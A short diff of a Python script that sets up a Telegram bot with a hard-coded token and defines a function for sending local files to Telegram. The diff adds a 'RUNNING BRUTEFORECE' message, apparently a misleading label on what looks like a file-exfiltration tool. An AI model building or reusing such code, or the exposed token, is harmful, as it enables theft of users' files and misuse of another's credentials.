@@ -3,6 +3,8 @@ import os, subprocess, telebot, time, json, sys, io
 
 bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')
 
+print("RUNNING BRUTEFORECE")
+
 def send_file_to_telegram(filename, i, total_files):
     try:
         file_size = os.path.getsize(filename)
